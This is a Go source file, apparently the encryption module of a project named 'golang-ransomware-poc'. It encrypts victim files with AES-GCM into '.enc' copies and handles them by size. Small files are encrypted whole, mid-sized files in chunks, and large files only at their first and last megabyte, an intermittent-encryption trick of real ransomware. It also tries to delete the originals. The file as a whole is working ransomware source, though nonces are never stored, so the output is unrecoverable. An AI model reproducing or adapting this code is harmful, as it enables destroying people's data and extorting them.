package encrypt

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"davidlares/golang-ransomware-poc/mapper"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"strings"
)

const (
	CHUNK_SIZE        = 0x100000
	FULL_ENCRYPT      = 0x100000
	PARTIAL_THRESHOLD = 0x500000
)

var Cont uint16

func EncryptWithXorAndAES(filename, keyFile string, encryptControl chan struct{}) error {
	// defer channel
	defer func() { <-encryptControl }()
	// then
	defer mapper.Wg.Done()
	// getting the file
	fileInfo, err := os.Stat(filename)
	os.IsNotExist(err)
	if err != nil {
		fmt.Println("File does not exist, probably already deleted", filename)
		return nil
	}
	// getting the size
	size := fileInfo.Size()
	file, err := os.Open(filename)
	if err != nil {
		if strings.Contains(err.Error(), "Used in another process") {
			fmt.Println("File is used", filename)
		}
		fmt.Println("Error to read file", err)
		return err
	}
	// closing file
	defer file.Close()
	// writing the encrypted file
	outFile, _ := os.Create(filename + ".enc")
	if err != nil {
		fmt.Println("Error to read file")
	}
	// closing file
	defer outFile.Close()
	// encrypted
	fmt.Println("Encrypted", filename+".enc", Cont)

	// then
	key, _ := ioutil.ReadFile(keyFile)
	if len(key) != 16 && len(key) != 24 && len(key) != 32 {
		fmt.Println("Key size should be 16, 24 or 32 bytes")
		return err
	}
	// generating the block
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println("Error to create AES block", err)
	}
	// generating the GCM
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		fmt.Println("Error to create AES-GSM", err)
	}
	// encrypting scenario
	switch {
	case size < FULL_ENCRYPT:
		return encryptChunk(file, outFile, gcm, size)
	case size >= FULL_ENCRYPT && size <= PARTIAL_THRESHOLD:
		return encryptChunks(file, outFile, gcm, size)
	case size > PARTIAL_THRESHOLD:
		return encryptEdge(file, outFile, gcm, size)
	}
	//
	os.Remove(filename)
	if err != nil {
		fmt.Println("Error removing the file")
	}
	// returning
	return nil
}

func ProcessAndEncrypt(file *os.File, out io.Writer, gcm cipher.AEAD, offset int64, size int64) error {
	buffer := make([]byte, size)
	_, err := file.ReadAt(buffer, offset)
	if err != nil && err != io.EOF {
		fmt.Println("Error reading chunk", err)
	}
	// nonce
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println("Error to create nonce")
	}
	// ciphertext
	cipherText := gcm.Seal(nil, nonce, buffer, nil)
	_, err = out.Write(cipherText)
	return nil
}

func encryptChunks(file *os.File, out io.Writer, gcm cipher.AEAD, totalSize int64) error {
	for offset := int64(0); offset < totalSize; offset += CHUNK_SIZE {
		remaining := totalSize - offset
		size := CHUNK_SIZE
		if remaining < CHUNK_SIZE {
			size = int(remaining)
		}
		err := ProcessAndEncrypt(file, out, gcm, offset, int64(size))
		if err != nil {
			return err
		}
	}
	return nil
}

func encryptEdge(file *os.File, out io.Writer, gcm cipher.AEAD, totalSize int64) error {
	err := ProcessAndEncrypt(file, out, gcm, 0, CHUNK_SIZE)
	if err != nil {
		return err
	}
	offset := totalSize - CHUNK_SIZE
	return ProcessAndEncrypt(file, out, gcm, offset, CHUNK_SIZE)
}

func encryptChunk(file *os.File, out io.Writer, gcm cipher.AEAD, length int64) error {
	return ProcessAndEncrypt(file, out, gcm, 0, length)
}
